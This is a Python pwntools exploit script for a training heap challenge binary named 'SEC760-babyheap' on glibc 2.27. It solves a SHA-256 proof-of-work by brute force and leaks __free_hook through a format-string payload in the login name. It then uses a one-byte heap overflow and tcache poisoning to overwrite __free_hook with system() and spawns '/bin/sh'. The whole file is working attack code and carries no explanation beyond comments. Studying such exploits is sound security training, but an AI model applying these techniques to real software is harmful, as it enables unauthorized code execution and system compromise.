from pwn import *
import random
from hashlib import sha256
import time
import itertools


elf = context.binary = ELF("SEC760-babyheap")
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

gs = '''
continue
'''

def start():
	if args.GDB:
		return gdb.debug(elf.path, gdbscript=gs)

	else:
		return process(elf.path)


def login(username, password):

    io.sendlineafter(b"> ", "1")
    io.sendlineafter(b"User: ", username)
    io.sendlineafter(b"Pass: ", password)
    r = io.recvuntil(b"\n")

def info():

    io.sendlineafter(b"> ", "2")
    r = io.recvuntil(b"\n")
    return r

def create(size, data):

    io.sendlineafter(b"> ", "3")
    io.sendlineafter(b"Size: ",size)
    io.sendlineafter(b"Data: ", data)
    r = io.recvuntil(b"\n")

def delete(index):

    io.sendlineafter(b"> ", "4")
    io.sendlineafter(b"Index: ", index)
    #r = io.recvuntil(b"\n")


io = start()
r = io.recvuntil(b"\n")


print("[+] Brute forcing the hash")

# Find the hash string from the program console message 
f = r.decode("utf-8")[84:90]

aAbcdefghijklmn = 'abcdefghijklmnopqrstuvwxyz0123456789'

# List of permutations
l = list(itertools.permutations(aAbcdefghijklmn, 4))

for p in l:
    
    p = ''.join(p)
    res = sha256(p.encode('utf-8')).hexdigest()[-6:] 
    
    if(res == f):
        print("[+] Hash found")
        io.sendlineafter(b"> ",p)
        break

# leaking the __free_hook address

login(b"%p%p%p%p%p%p%p%p%p%p%p%p", b"7c3ffbfc0f2f7c7ec202880c71555e27")

free_hook_leak = info()[15:29]

free_hook_addr = int(free_hook_leak, 16)

print("[+] __free_hook address : " + hex(free_hook_addr))

# Using the free hook offset to leak libc address

free_hook_offset = libc.symbols['__free_hook']

libc_addr = free_hook_addr - free_hook_offset

print("[+] Libc addres :" + hex(libc_addr))

# Getting System address

system_offset = libc.symbols['system']

system_addr = libc_addr + system_offset

print("[+] System address :" + hex(system_addr))


# Create 3 chunks
create(b"24", b"AAAAAAAA")
create(b"24", b"BBBBBBBB")
create(b"24", b"CCCCCCCC")

# Free chunk A
delete(b"0")

# overwrite the filed size of chunk B using one byte overflow from chunk A

create(b"24", b"/bin/sh\0" + b"A"*17)

# Free chunk C
delete(b"2")

# Free chunk B
delete(b"1")
#
# Request chunk from the 0x60 tcache bin
# and overwrite the tcache pointeres of chunk C

create(b"56", b"C"*16 + pack(0) + pack(0x20) + pack(free_hook_addr))

# request a chunk from the bins where C to get rid of that chunk from the tcachebins
# so that the next pointer will point to the target address

create(b"24", pack(0xdeadbeef))

create(b"24", pack(system_addr))

delete(b"0")

io.interactive()

